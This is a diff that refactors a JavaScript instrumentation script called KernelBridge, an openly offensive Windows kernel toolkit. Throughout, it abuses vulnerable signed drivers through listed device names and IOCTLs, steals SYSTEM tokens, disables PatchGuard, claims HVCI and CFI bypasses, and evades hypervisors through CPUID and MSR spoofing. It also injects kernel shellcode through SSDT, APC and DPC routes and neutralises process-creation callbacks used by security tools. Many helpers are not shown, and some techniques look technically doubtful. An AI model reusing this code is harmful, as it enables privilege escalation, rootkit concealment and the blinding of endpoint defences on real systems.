+              ioctl: 0x80002048,
+              method: 'msi_afterburner',
+            },
+            {
+              name: 'WinRing0x64.sys',
+              device: '\\\\.\\WinRing0_1_2_0',
+              ioctl: 0x80002010,
+              method: 'physical_memory',
+            },
+            {
+              name: 'AsIO3.sys',
+              device: '\\\\.\\AsIO3',
+              ioctl: 0x80002044,
+              method: 'asus_io',
+            },
+            {
+              name: 'GPU-Z.sys',
+              device: '\\\\.\\GPUZDevice',
+              ioctl: 0x80002050,
+              method: 'gpu_direct',
+            },
+            {
+              name: 'HWiNFO64A.sys',
+              device: '\\\\.\\HWiNFO64',
+              ioctl: 0x80002030,
+              method: 'hwinfo_direct',
+            },
+          ];
 
-            modernVulnDrivers.forEach(function (driver) {
-                var handle = self.openDevice(driver.device);
-                if (handle && handle.toInt32() !== -1) {
-                    self.exploitAdvancedDriverVulns[driver.name] = {
+          modernVulnDrivers.forEach(driver => {
+              const handle = this.openDevice(driver.device);
+              if (handle && handle.toInt32() !== -1) {
+                    this.exploitAdvancedDriverVulns[driver.name] = {
                         handle: handle,
                         ioctl: driver.ioctl,
                         method: driver.method,
@@ -1221,19 +1210,19 @@ const KernelBridge = {
                     // Attempt exploitation based on method
                     switch (driver.method) {
                         case 'msi_afterburner':
-                            self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
+                            this.exploitMSIAfterburnerVuln(handle, driver.ioctl);
                             break;
                         case 'physical_memory':
-                            self.exploitPhysicalMemoryAccess(handle, driver.ioctl);
+                            this.exploitPhysicalMemoryAccess(handle, driver.ioctl);
                             break;
                         case 'asus_io':
-                            self.exploitAsusIOVuln(handle, driver.ioctl);
+                            this.exploitAsusIOVuln(handle, driver.ioctl);
                             break;
                         case 'gpu_direct':
-                            self.exploitGPUDirectAccess(handle, driver.ioctl);
+                            this.exploitGPUDirectAccess(handle, driver.ioctl);
                             break;
                         case 'hwinfo_direct':
-                            self.exploitHWInfoDirect(handle, driver.ioctl);
+                            this.exploitHWInfoDirect(handle, driver.ioctl);
                             break;
                     }
 
@@ -1270,7 +1259,6 @@ const KernelBridge = {
 
     // 2. Kernel object manipulation for advanced bypass techniques
     setupKernelObjectManipulation: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1287,14 +1275,14 @@ const KernelBridge = {
             };
 
             // Advanced token manipulation
-            this.setupAdvancedTokenManipulation = function () {
+            this.setupAdvancedTokenManipulation = () => {
                 // Find token objects in kernel space
-                var systemToken = self.findSystemProcessToken();
-                if (systemToken) {
+              const systemToken = this.findSystemProcessToken();
+              if (systemToken) {
                     // Clone SYSTEM token privileges
-                    var currentToken = self.getCurrentProcessToken();
-                    if (currentToken) {
-                        self.copyTokenPrivileges(systemToken, currentToken);
+                  const currentToken = this.getCurrentProcessToken();
+                  if (currentToken) {
+                        this.copyTokenPrivileges(systemToken, currentToken);
 
                         send({
                             type: 'privilege_escalation',
@@ -1308,72 +1296,73 @@ const KernelBridge = {
             };
 
             // Advanced driver object manipulation
-            this.setupDriverObjectManipulation = function () {
+            this.setupDriverObjectManipulation = () => {
                 // Enumerate all driver objects
-                var driverList = self.enumerateDriverObjects();
-                driverList.forEach(function (driver) {
+              const driverList = this.enumerateDriverObjects();
+              driverList.forEach(driver => {
                     // Store original dispatch routines
-                    self.kernelObjects.driverObjects[driver.name] = {
+                    this.kernelObjects.driverObjects[driver.name] = {
                         object: driver.object,
                         originalDispatch: driver.dispatch,
                         hooked: false,
                     };
 
                     // Hook IRP dispatch for interesting drivers
-                    if (self.isInterestingDriver(driver.name)) {
-                        self.hookDriverDispatch(driver.object, driver.name);
+                    if (this.isInterestingDriver(driver.name)) {
+                        this.hookDriverDispatch(driver.object, driver.name);
                     }
                 });
             };
 
             // Advanced device object manipulation
-            this.setupDeviceObjectManipulation = function () {
+            this.setupDeviceObjectManipulation = () => {
                 // Find and manipulate critical device objects
-                var criticalDevices = [
-                    '\\Device\\PhysicalMemory',
-                    '\\Device\\KernelObjects',
-                    '\\Device\\DirectRdDr',
-                    '\\Device\\Harddisk0\\DR0',
-                ];
+              const criticalDevices = [
+                '\\Device\\PhysicalMemory',
+                '\\Device\\KernelObjects',
+                '\\Device\\DirectRdDr',
+                '\\Device\\Harddisk0\\DR0',
+              ];
 
-                criticalDevices.forEach(function (deviceName) {
-                    var deviceObject = self.findDeviceObject(deviceName);
-                    if (deviceObject) {
-                        self.kernelObjects.deviceObjects[deviceName] = {
+              criticalDevices.forEach(deviceName => {
+                  const deviceObject = this.findDeviceObject(deviceName);
+                  if (deviceObject) {
+                        this.kernelObjects.deviceObjects[deviceName] = {
                             object: deviceObject,
-                            originalFlags: self
-                                .readKernelMemory(deviceObject.add(0x30), 4)
-                                .readU32(),
+                            originalFlags: this.readKernelMemory(
+                                deviceObject.add(0x30),
+                                4
+                            ).readU32(),
                             manipulated: false,
                         };
 
                         // Modify device characteristics for bypass
-                        self.manipulateDeviceCharacteristics(deviceObject);
+                        this.manipulateDeviceCharacteristics(deviceObject);
                     }
                 });
             };
 
             // Advanced section object manipulation
-            this.setupSectionObjectManipulation = function () {
+            this.setupSectionObjectManipulation = () => {
                 // Manipulate memory sections for code injection
-                var ntdllSection = self.findModuleSection('ntdll.dll');
-                var kernelSection = self.findModuleSection('ntoskrnl.exe');
+              const ntdllSection = this.findModuleSection('ntdll.dll');
+              const kernelSection = this.findModuleSection('ntoskrnl.exe');
 
-                if (ntdllSection) {
-                    self.kernelObjects.sectionObjects['ntdll'] = {
+              if (ntdllSection) {
+                    this.kernelObjects.sectionObjects.ntdll = {
                         section: ntdllSection,
-                        originalProtection: self.getSectionProtection(ntdllSection),
+                        originalProtection: this.getSectionProtection(ntdllSection),
                         modified: false,
                     };
 
                     // Modify section permissions for injection
-                    self.modifySectionPermissions(ntdllSection, 0x40); // PAGE_EXECUTE_READWRITE
+                    this.modifySectionPermissions(ntdllSection, 0x40); // PAGE_EXECUTE_READWRITE
                 }
 
                 if (kernelSection) {
-                    self.kernelObjects.sectionObjects['kernel'] = {
+                    this.kernelObjects.sectionObjects.kernel = {
                         section: kernelSection,
-                        originalProtection: self.getSectionProtection(kernelSection),
+                        originalProtection: this.getSectionProtection(kernelSection),
                         modified: false,
                     };
                 }
@@ -1402,7 +1391,6 @@ const KernelBridge = {
 
     // 3. Advanced PatchGuard bypass with multiple modern techniques
     initializeAdvancedPatchGuardBypass: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1424,33 +1412,33 @@ const KernelBridge = {
             };
 
             // Advanced context modification bypass
-            this.setupContextModificationBypass = function () {
+            this.setupContextModificationBypass = () => {
                 // Find PatchGuard contexts
-                var pgContexts = self.findPatchGuardContexts();
-                pgContexts.forEach(function (context) {
-                    self.patchGuardBypass.pgContexts.push({
+              const pgContexts = this.findPatchGuardContexts();
+              pgContexts.forEach(context => {
+                    this.patchGuardBypass.pgContexts.push({
                         address: context,
-                        original: self.readKernelMemory(context, 0x100),
+                        original: this.readKernelMemory(context, 0x100),
                         modified: false,
                     });
 
                     // Modify PatchGuard context to disable checks
-                    var modifiedContext = self.createModifiedPGContext(context);
-                    self.writeKernelMemory(context, modifiedContext);
+                  const modifiedContext = this.createModifiedPGContext(context);
+                  this.writeKernelMemory(context, modifiedContext);
                 });
 
-                self.patchGuardBypass.methods.contextModification = pgContexts.length > 0;
+                this.patchGuardBypass.methods.contextModification = pgContexts.length > 0;
             };
 
             // Advanced timer manipulation bypass
-            this.setupTimerManipulationBypass = function () {
+            this.setupTimerManipulationBypass = () => {
                 // Hook KeSetTimer functions to intercept PatchGuard timers
-                var timerFunctions = ['KeSetTimer', 'KeSetTimerEx', 'KeCancelTimer'];
-                timerFunctions.forEach(function (funcName) {
-                    var funcAddr = self.getKernelExport(funcName);
-                    if (funcAddr) {
-                        self.installTimerHook(funcAddr, funcName);
-                        self.patchGuardBypass.hookedTimers.push({
+              const timerFunctions = ['KeSetTimer', 'KeSetTimerEx', 'KeCancelTimer'];
+              timerFunctions.forEach(funcName => {
+                  const funcAddr = this.getKernelExport(funcName);
+                  if (funcAddr) {
+                        this.installTimerHook(funcAddr, funcName);
+                        this.patchGuardBypass.hookedTimers.push({
                             function: funcName,
                             address: funcAddr,
                             hooked: true,
@@ -1458,66 +1446,66 @@ const KernelBridge = {
                     }
                 });
 
-                self.patchGuardBypass.methods.timerManipulation =
-                    self.patchGuardBypass.hookedTimers.length > 0;
+                this.patchGuardBypass.methods.timerManipulation =
+                    this.patchGuardBypass.hookedTimers.length > 0;
             };
 
             // Advanced interrupt hooking bypass
-            this.setupInterruptHookingBypass = function () {
+            this.setupInterruptHookingBypass = () => {
                 // Hook interrupt handlers to prevent PatchGuard checks
-                var interruptVectors = [0x2e, 0x2f, 0xd1, 0xe1]; // Common PatchGuard interrupts
-                interruptVectors.forEach(function (vector) {
-                    var handler = self.getInterruptHandler(vector);
-                    if (handler) {
-                        var hookHandler = self.createInterruptHook(handler);
-                        self.setInterruptHandler(vector, hookHandler);
+              const interruptVectors = [0x2e, 0x2f, 0xd1, 0xe1]; // Common PatchGuard interrupts
+                interruptVectors.forEach(vector => {
+                  const handler = this.getInterruptHandler(vector);
+                  if (handler) {
+                      const hookHandler = this.createInterruptHook(handler);
+                      this.setInterruptHandler(vector, hookHandler);
                     }
                 });
 
-                self.patchGuardBypass.methods.interruptHooking = true;
+                this.patchGuardBypass.methods.interruptHooking = true;
             };
 
             // HVCI (Hypervisor-protected Code Integrity) bypass
-            this.setupHVCIBypass = function () {
+            this.setupHVCIBypass = () => {
                 // Check if HVCI is enabled
-                if (self.isHVCIEnabled()) {
+                if (this.isHVCIEnabled()) {
                     // Bypass HVCI through hypervisor manipulation
-                    var hvciBase = self.findHVCIBase();
-                    if (hvciBase) {
+                  const hvciBase = this.findHVCIBase();
+                  if (hvciBase) {
                         // Modify HVCI control structures
-                        self.manipulateHVCIStructures(hvciBase);
-                        self.patchGuardBypass.methods.hvciBypass = true;
+                        this.manipulateHVCIStructures(hvciBase);
+                        this.patchGuardBypass.methods.hvciBypass = true;
                     }
                 }
             };
 
             // CFI (Control Flow Integrity) bypass
-            this.setupCFIBypass = function () {
+            this.setupCFIBypass = () => {
                 // Check if CFI is enabled
-                if (self.isCFIEnabled()) {
+                if (this.isCFIEnabled()) {
                     // Bypass CFI through ROP chain manipulation
-                    var cfiStructures = self.findCFIStructures();
-                    cfiStructures.forEach(function (structure) {
-                        self.manipulateCFIStructure(structure);
+                  const cfiStructures = this.findCFIStructures();
+                  cfiStructures.forEach(structure => {
+                        this.manipulateCFIStructure(structure);
                     });
-                    self.patchGuardBypass.methods.cfiBypass = true;
+                    this.patchGuardBypass.methods.cfiBypass = true;
                 }
             };
 
             // Advanced PatchGuard notification hook
-            this.setupPGNotificationBypass = function () {
+            this.setupPGNotificationBypass = () => {
                 // Hook KeBugCheckEx to intercept PatchGuard bug checks
-                var keBugCheckEx = self.getKernelExport('KeBugCheckEx');
-                if (keBugCheckEx) {
-                    self.installInlineHook(keBugCheckEx, 'KeBugCheckEx_PGBypass');
+              const keBugCheckEx = this.getKernelExport('KeBugCheckEx');
+              if (keBugCheckEx) {
+                    this.installInlineHook(keBugCheckEx, 'KeBugCheckEx_PGBypass');
                 }
 
                 // Hook other notification mechanisms
-                var notificationFunctions = ['KiDisplayBlueScreen', 'HalDisplayString'];
-                notificationFunctions.forEach(function (funcName) {
-                    var funcAddr = self.getKernelExport(funcName);
-                    if (funcAddr) {
-                        self.installInlineHook(funcAddr, funcName + '_PGBypass');
+              const notificationFunctions = ['KiDisplayBlueScreen', 'HalDisplayString'];
+              notificationFunctions.forEach(funcName => {
+                  const funcAddr = this.getKernelExport(funcName);
+                  if (funcAddr) {
+                        this.installInlineHook(funcAddr, `${funcName}_PGBypass`);
                     }
                 });
             };
@@ -1537,9 +1525,7 @@ const KernelBridge = {
                 target: 'kernel_bridge',
                 action: 'advanced_patchguard_bypass_complete',
                 methods_active: Object.keys(this.patchGuardBypass.methods).filter(
-                    function (method) {
-                        return self.patchGuardBypass.methods[method];
-                    }
+                    method => this.patchGuardBypass.methods[method]
                 ).length,
             });
         } catch {
@@ -1554,7 +1540,6 @@ const KernelBridge = {
 
     // 4. Hypervisor evasion for modern virtualized security environments
     setupHypervisorEvasion: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1577,16 +1562,16 @@ const KernelBridge = {
             };
 
             // Advanced hypervisor detection
-            this.detectAdvancedHypervisors = function () {
-                var hypervisors = [];
+            this.detectAdvancedHypervisors = () => {
+              const hypervisors = [];
 
-                // CPUID-based detection
+              // CPUID-based detection
                 try {
-                    var cpuidInfo = self.getCPUIDInfo();
-                    if (cpuidInfo.hypervisorBit) {
-                        var vendor = cpuidInfo.hypervisorVendor;
-                        hypervisors.push({
-                            name: self.identifyHypervisorByVendor(vendor),
+                  const cpuidInfo = this.getCPUIDInfo();
+                  if (cpuidInfo.hypervisorBit) {
+                      const vendor = cpuidInfo.hypervisorVendor;
+                      hypervisors.push({
+                            name: this.identifyHypervisorByVendor(vendor),
                             vendor: vendor,
                             detection_method: 'cpuid',
                         });
@@ -1595,10 +1580,10 @@ const KernelBridge = {
 
                 // MSR-based detection
                 try {
-                    var hypervisorMSRs = [0x40000000, 0x40000001, 0x40000010];
-                    hypervisorMSRs.forEach(function (msr) {
-                        var value = self.readMSR(msr);
-                        if (value !== null) {
+                  const hypervisorMSRs = [0x40000000, 0x40000001, 0x40000010];
+                  hypervisorMSRs.forEach(msr => {
+                      const value = this.readMSR(msr);
+                      if (value !== null) {
                             hypervisors.push({
                                 name: 'Unknown',
                                 msr: msr,
@@ -1610,8 +1595,8 @@ const KernelBridge = {
                 } catch {}
 
                 // Timing-based detection
-                var timingResults = self.performTimingDetection();
-                if (timingResults.hypervisorDetected) {
+              const timingResults = this.performTimingDetection();
+              if (timingResults.hypervisorDetected) {
                     hypervisors.push({
                         name: 'Unknown',
                         timing_overhead: timingResults.overhead,
@@ -1623,11 +1608,11 @@ const KernelBridge = {
             };
 
             // CPUID spoofing for hypervisor evasion
-            this.setupCPUIDSpoofing = function () {
+            this.setupCPUIDSpoofing = () => {
                 // Hook CPUID instruction execution
-                var cpuidHandler = self.createCPUIDHandler();
-                if (self.hookCPUIDInstruction(cpuidHandler)) {
-                    self.hypervisorEvasion.evasionMethods.cpuidSpoofing = true;
+              const cpuidHandler = this.createCPUIDHandler();
+              if (this.hookCPUIDInstruction(cpuidHandler)) {
+                    this.hypervisorEvasion.evasionMethods.cpuidSpoofing = true;
 
                     send({
                         type: 'evasion',
@@ -1638,40 +1623,40 @@ const KernelBridge = {
             };
 
             // Timing attack evasion
-            this.setupTimingAttackEvasion = function () {
+            this.setupTimingAttackEvasion = () => {
                 // Hook timing-related functions
-                var timingFunctions = [
-                    'KeQueryPerformanceCounter',
-                    'KeQuerySystemTime',
-                    'RtlGetSystemTimePrecise',
-                ];
-                var hookedCount = 0;
+              const timingFunctions = [
+                'KeQueryPerformanceCounter',
+                'KeQuerySystemTime',
+                'RtlGetSystemTimePrecise',
+              ];
+              let hookedCount = 0;
 
-                timingFunctions.forEach(function (funcName) {
-                    var funcAddr = self.getKernelExport(funcName);
-                    if (funcAddr) {
-                        self.installInlineHook(funcAddr, funcName + '_TimingEvasion');
+              timingFunctions.forEach(funcName => {
+                  const funcAddr = this.getKernelExport(funcName);
+                  if (funcAddr) {
+                        this.installInlineHook(funcAddr, `${funcName}_TimingEvasion`);
                         hookedCount++;
                     }
                 });
 
-                self.hypervisorEvasion.evasionMethods.timingAttackEvasion = hookedCount > 0;
+                this.hypervisorEvasion.evasionMethods.timingAttackEvasion = hookedCount > 0;
             };
 
             // VMEXIT hooking for advanced hypervisor evasion
-            this.setupVMExitHooking = function () {
+            this.setupVMExitHooking = () => {
                 // Hook common VMEXIT triggers
-                var vmexitTriggers = [
-                    { instruction: 'VMCALL', handler: self.createVMCallHook },
-                    { instruction: 'CPUID', handler: self.createCPUIDHook },
-                    { instruction: 'MSR', handler: self.createMSRHook },
-                    { instruction: 'CR', handler: self.createCRHook },
-                ];
+              const vmexitTriggers = [
+                {instruction: 'VMCALL', handler: this.createVMCallHook},
+                {instruction: 'CPUID', handler: this.createCPUIDHook},
+                {instruction: 'MSR', handler: this.createMSRHook},
+                {instruction: 'CR', handler: this.createCRHook},
+              ];
 
-                vmexitTriggers.forEach(function (trigger) {
+              vmexitTriggers.forEach(trigger => {
                     try {
-                        var handler = trigger.handler();
-                        if (self.installVMExitHook(trigger.instruction, handler)) {
+                      const handler = trigger.handler();
+                      if (this.installVMExitHook(trigger.instruction, handler)) {
                             send({
                                 type: 'evasion',
                                 target: 'kernel_bridge',
@@ -1682,29 +1667,29 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.hypervisorEvasion.evasionMethods.vmexitHooking = true;
+                this.hypervisorEvasion.evasionMethods.vmexitHooking = true;
             };
 
             // MSR manipulation for hypervisor evasion
-            this.setupMSRManipulation = function () {
+            this.setupMSRManipulation = () => {
                 // Manipulate hypervisor-specific MSRs
-                var hypervisorMSRs = [
-                    { msr: 0x174, name: 'SYSENTER_CS' },
-                    { msr: 0x175, name: 'SYSENTER_ESP' },
-                    { msr: 0x176, name: 'SYSENTER_EIP' },
-                    { msr: 0x40000000, name: 'HYPERVISOR_VERSION' },
-                    { msr: 0x40000001, name: 'HYPERVISOR_INTERFACE' },
-                ];
+              const hypervisorMSRs = [
+                {msr: 0x174, name: 'SYSENTER_CS'},
+                {msr: 0x175, name: 'SYSENTER_ESP'},
+                {msr: 0x176, name: 'SYSENTER_EIP'},
+                {msr: 0x40000000, name: 'HYPERVISOR_VERSION'},
+                {msr: 0x40000001, name: 'HYPERVISOR_INTERFACE'},
+              ];
 
-                hypervisorMSRs.forEach(function (msrInfo) {
+              hypervisorMSRs.forEach(msrInfo => {
                     try {
-                        var originalValue = self.readMSR(msrInfo.msr);
-                        if (originalValue !== null) {
-                            var spoofedValue = self.generateSpoofedMSRValue(
-                                msrInfo.msr,
-                                originalValue
-                            );
-                            self.writeMSR(msrInfo.msr, spoofedValue);
+                      const originalValue = this.readMSR(msrInfo.msr);
+                      if (originalValue !== null) {
+                          const spoofedValue = this.generateSpoofedMSRValue(
+                            msrInfo.msr,
+                            originalValue
+                          );
+                          this.writeMSR(msrInfo.msr, spoofedValue);
 
                             send({
                                 type: 'evasion',
@@ -1718,17 +1703,17 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.hypervisorEvasion.evasionMethods.msrManipulation = true;
+                this.hypervisorEvasion.evasionMethods.msrManipulation = true;
             };
 
             // Hypercall interception
-            this.setupHypercallInterception = function () {
+            this.setupHypercallInterception = () => {
                 // Intercept common hypercalls
-                var commonHypercalls = [0x0001, 0x0002, 0x0008, 0x000c, 0x0012]; // VMware hypercalls
+              const commonHypercalls = [0x0001, 0x0002, 0x0008, 0x000c, 0x0012]; // VMware hypercalls
 
-                commonHypercalls.forEach(function (hypercallNum) {
-                    var interceptor = self.createHypercallInterceptor(hypercallNum);
-                    if (self.installHypercallHook(hypercallNum, interceptor)) {
+                commonHypercalls.forEach(hypercallNum => {
+                  const interceptor = this.createHypercallInterceptor(hypercallNum);
+                  if (this.installHypercallHook(hypercallNum, interceptor)) {
                         send({
                             type: 'evasion',
                             target: 'kernel_bridge',
@@ -1738,7 +1723,7 @@ const KernelBridge = {
                     }
                 });
 
-                self.hypervisorEvasion.evasionMethods.hypercallInterception = true;
+                this.hypervisorEvasion.evasionMethods.hypercallInterception = true;
             };
 
             // Detect hypervisors first
@@ -1757,9 +1742,7 @@ const KernelBridge = {
                 action: 'hypervisor_evasion_complete',
                 detected_hypervisors: this.hypervisorEvasion.detectedHypervisors.length,
                 active_evasions: Object.keys(this.hypervisorEvasion.evasionMethods).filter(
-                    function (method) {
-                        return self.hypervisorEvasion.evasionMethods[method];
-                    }
+                    method => this.hypervisorEvasion.evasionMethods[method]
                 ).length,
             });
         } catch {
@@ -1774,7 +1757,6 @@ const KernelBridge = {
 
     // 5. Advanced kernel code injection with modern bypass techniques
     initializeKernelCodeInjection: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1796,18 +1778,18 @@ const KernelBridge = {
             };
 
             // Atomic code injection for stealth
-            this.setupAtomicCodeInjection = function () {
+            this.setupAtomicCodeInjection = () => {
                 // Find suitable injection points in kernel space
-                var injectionPoints = self.findKernelInjectionPoints();
-                injectionPoints.forEach(function (point) {
+              const injectionPoints = this.findKernelInjectionPoints();
+              injectionPoints.forEach(point => {
                     // Create atomic shellcode
-                    var shellcode = self.createAtomicShellcode(point.type);
+                  const shellcode = this.createAtomicShellcode(point.type);
 
-                    // Inject using single instruction replacement
-                    var originalBytes = self.readKernelMemory(point.address, shellcode.length);
-                    self.writeKernelMemory(point.address, shellcode);
+                  // Inject using single instruction replacement
+                  const originalBytes = this.readKernelMemory(point.address, shellcode.length);
+                  this.writeKernelMemory(point.address, shellcode);
 
-                    self.kernelCodeInjection.injectedCode.push({
+                    this.kernelCodeInjection.injectedCode.push({
                         address: point.address,
                         original: originalBytes,
                         injected: shellcode,
@@ -1815,28 +1797,28 @@ const KernelBridge = {
                     });
                 });
 
-                self.kernelCodeInjection.injectionMethods.atomicInjection =
+                this.kernelCodeInjection.injectionMethods.atomicInjection =
                     injectionPoints.length > 0;
             };
 
             // Driver entry point hooking
-            this.setupDriverEntryPointHook = function () {
+            this.setupDriverEntryPointHook = () => {
                 // Find loaded drivers
-                var loadedDrivers = self.enumerateLoadedDrivers();
-                var targetDrivers = loadedDrivers.filter(function (driver) {
-                    return self.isTargetDriver(driver.name);
-                });
+              const loadedDrivers = this.enumerateLoadedDrivers();
+              const targetDrivers = loadedDrivers.filter(driver =>
+                this.isTargetDriver(driver.name)
+              );
 
-                targetDrivers.forEach(function (driver) {
-                    var entryPoint = self.getDriverEntryPoint(driver);
-                    if (entryPoint) {
+              targetDrivers.forEach(driver => {
+                  const entryPoint = this.getDriverEntryPoint(driver);
+                  if (entryPoint) {
                         // Create hook at driver entry point
-                        var originalEntry = self.readKernelMemory(entryPoint, 16);
+                      const originalEntry = this.readKernelMemory(entryPoint, 16);
 
-                        // Install hook
-                        self.installInlineHook(entryPoint, 'DriverEntry_' + driver.name);
+                      // Install hook
+                        this.installInlineHook(entryPoint, `DriverEntry_${driver.name}`);
 
-                        self.kernelCodeInjection.injectedCode.push({
+                        this.kernelCodeInjection.injectedCode.push({
                             address: entryPoint,
                             original: originalEntry,
                             type: 'driver_entry',
@@ -1845,48 +1827,48 @@ const KernelBridge = {
                     }
                 });
 
-                self.kernelCodeInjection.injectionMethods.driverEntryPointHook =
+                this.kernelCodeInjection.injectionMethods.driverEntryPointHook =
                     targetDrivers.length > 0;
             };
 
             // System call injection
-            this.setupSystemCallInjection = function () {
+            this.setupSystemCallInjection = () => {
                 // Create custom system call
-                var customSyscallCode = self.createCustomSystemCall();
-                var syscallAddress = self.allocateKernelMemory(customSyscallCode.length);
-                self.writeKernelMemory(syscallAddress, customSyscallCode);
+              const customSyscallCode = this.createCustomSystemCall();
+              const syscallAddress = this.allocateKernelMemory(customSyscallCode.length);
+              this.writeKernelMemory(syscallAddress, customSyscallCode);
 
                 // Add to SSDT
-                var emptySyscallSlot = self.findEmptySSDTSlot();
-                if (emptySyscallSlot !== -1) {
-                    var ssdtEntry = syscallAddress.sub(self.ssdtAddress).toInt32() << 4;
-                    self.writeKernelMemory(self.ssdtAddress.add(emptySyscallSlot * 4), ssdtEntry);
+              const emptySyscallSlot = this.findEmptySSDTSlot();
+              if (emptySyscallSlot !== -1) {
+                  const ssdtEntry = syscallAddress.sub(this.ssdtAddress).toInt32() << 4;
+                  this.writeKernelMemory(this.ssdtAddress.add(emptySyscallSlot * 4), ssdtEntry);
 
-                    self.kernelCodeInjection.payloads['custom_syscall'] = {
+                    this.kernelCodeInjection.payloads.custom_syscall = {
                         address: syscallAddress,
                         ssdt_index: emptySyscallSlot,
                         active: true,
                     };
 
-                    self.kernelCodeInjection.injectionMethods.systemCallInjection = true;
+                    this.kernelCodeInjection.injectionMethods.systemCallInjection = true;
                 }
             };
 
             // APC (Asynchronous Procedure Call) injection
-            this.setupAPCInjection = function () {
+            this.setupAPCInjection = () => {
                 // Find target processes for APC injection
-                var targetProcesses = self.findTargetProcesses();
-                var injectedCount = 0;
+              const targetProcesses = this.findTargetProcesses();
+              let injectedCount = 0;
 
-                targetProcesses.forEach(function (process) {
+              targetProcesses.forEach(process => {
                     // Create APC routine
-                    var apcRoutine = self.createAPCRoutine();
-                    var apcAddress = self.allocateKernelMemory(apcRoutine.length);
-                    self.writeKernelMemory(apcAddress, apcRoutine);
+                  const apcRoutine = this.createAPCRoutine();
+                  const apcAddress = this.allocateKernelMemory(apcRoutine.length);
+                  this.writeKernelMemory(apcAddress, apcRoutine);
 
                     // Queue APC
-                    if (self.queueKernelAPC(process.eprocess, apcAddress)) {
-                        self.kernelCodeInjection.payloads['apc_' + process.pid] = {
+                    if (this.queueKernelAPC(process.eprocess, apcAddress)) {
+                        this.kernelCodeInjection.payloads[`apc_${process.pid}`] = {
                             address: apcAddress,
                             process: process.pid,
                             queued: true,
@@ -1895,49 +1877,49 @@ const KernelBridge = {
                     }
                 });
 
-                self.kernelCodeInjection.injectionMethods.apcInjection = injectedCount > 0;
+                this.kernelCodeInjection.injectionMethods.apcInjection = injectedCount > 0;
             };
 
             // DPC (Deferred Procedure Call) injection
-            this.setupDPCInjection = function () {
+            this.setupDPCInjection = () => {
                 // Create DPC routine
-                var dpcRoutine = self.createDPCRoutine();
-                var dpcAddress = self.allocateKernelMemory(dpcRoutine.length);
-                self.writeKernelMemory(dpcAddress, dpcRoutine);
+              const dpcRoutine = this.createDPCRoutine();
+              const dpcAddress = this.allocateKernelMemory(dpcRoutine.length);
+              this.writeKernelMemory(dpcAddress, dpcRoutine);
 
                 // Queue DPC
-                if (self.queueKernelDPC(dpcAddress)) {
-                    self.kernelCodeInjection.payloads['kernel_dpc'] = {
+                if (this.queueKernelDPC(dpcAddress)) {
+                    this.kernelCodeInjection.payloads.kernel_dpc = {
                         address: dpcAddress,
                         queued: true,
                         active: true,
                     };
 
-                    self.kernelCodeInjection.injectionMethods.dpcInjection = true;
+                    this.kernelCodeInjection.injectionMethods.dpcInjection = true;
                 }
             };
 
             // Advanced shellcode creation
-            this.createAdvancedShellcodes = function () {
+            this.createAdvancedShellcodes = () => {
                 // Token stealing shellcode
-                self.kernelCodeInjection.shellcodes['token_steal'] =
-                    self.createTokenStealShellcode();
+                this.kernelCodeInjection.shellcodes.token_steal =
+                    this.createTokenStealShellcode();
 
                 // Callback removal shellcode
-                self.kernelCodeInjection.shellcodes['callback_remove'] =
-                    self.createCallbackRemovalShellcode();
+                this.kernelCodeInjection.shellcodes.callback_remove =
+                    this.createCallbackRemovalShellcode();
 
                 // SSDT restoration shellcode
-                self.kernelCodeInjection.shellcodes['ssdt_restore'] =
-                    self.createSSDTRestorationShellcode();
+                this.kernelCodeInjection.shellcodes.ssdt_restore =
+                    this.createSSDTRestorationShellcode();
 
                 // Process hiding shellcode
-                self.kernelCodeInjection.shellcodes['process_hide'] =
-                    self.createProcessHidingShellcode();
+                this.kernelCodeInjection.shellcodes.process_hide =
+                    this.createProcessHidingShellcode();
 
                 // Registry manipulation shellcode
-                self.kernelCodeInjection.shellcodes['registry_manip'] =
-                    self.createRegistryManipulationShellcode();
+                this.kernelCodeInjection.shellcodes.registry_manip =
+                    this.createRegistryManipulationShellcode();
             };
 
             // Execute all injection methods
@@ -1968,7 +1950,6 @@ const KernelBridge = {
 
     // 6. Advanced callback evasion with comprehensive bypass techniques
     setupAdvancedCallbackEvasion: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1992,14 +1973,14 @@ const KernelBridge = {
             };
 
             // Advanced process callback evasion
-            this.setupProcessCallbackEvasion = function () {
+            this.setupProcessCallbackEvasion = () => {
                 // Find all process creation callbacks
-                var pspCallbacks = self.findPspCreateProcessNotifyRoutine();
-                if (pspCallbacks) {
-                    for (var i = 0; i < 64; i++) {
-                        var callback = self.readKernelMemory(pspCallbacks.add(i * 8), 8);
+              const pspCallbacks = this.findPspCreateProcessNotifyRoutine();
+              if (pspCallbacks) {
+                    for (let i = 0; i < 64; i++) {
+                        var callback = this.readKernelMemory(pspCallbacks.add(i * 8), 8);
                         if (callback.toInt32() !== 0) {
-                            self.callbackEvasion.processCallbacks.push({
+                            this.callbackEvasion.processCallbacks.push({
                                 index: i,
                                 address: callback,
                                 original: callback,
@@ -2008,33 +1989,33 @@ const KernelBridge = {
 
                             // Create neutralization hook
 
-                            self.installInlineHook(callback, 'ProcessCallback_' + i);
+                            this.installInlineHook(callback, `ProcessCallback_${i}`);
                         }
                     }
                 }
 
                 // Find extended process callbacks (Windows 10+)
-                var extendedCallbacks = self.findExtendedProcessCallbacks();
-                extendedCallbacks.forEach(function (callback) {
-                    self.callbackEvasion.processCallbacks.push({
+              const extendedCallbacks = this.findExtendedProcessCallbacks();
+              extendedCallbacks.forEach(callback => {
+                    this.callbackEvasion.processCallbacks.push({
                         address: callback,
                         type: 'extended',
                         neutralized: false,
                     });
 
-                    self.installInlineHook(callback, 'ExtendedProcessCallback');
+                    this.installInlineHook(callback, 'ExtendedProcessCallback');
                 });
             };
 
             // Advanced thread callback evasion
-            this.setupThreadCallbackEvasion = function () {
+            this.setupThreadCallbackEvasion = () => {
                 // Find thread creation callbacks
-                var threadCallbacks = self.findPspCreateThreadNotifyRoutine();
-                if (threadCallbacks) {
-                    for (var i = 0; i < 64; i++) {
-                        var callback = self.readKernelMemory(threadCallbacks.add(i * 8), 8);
-                        if (callback.toInt32() !== 0) {
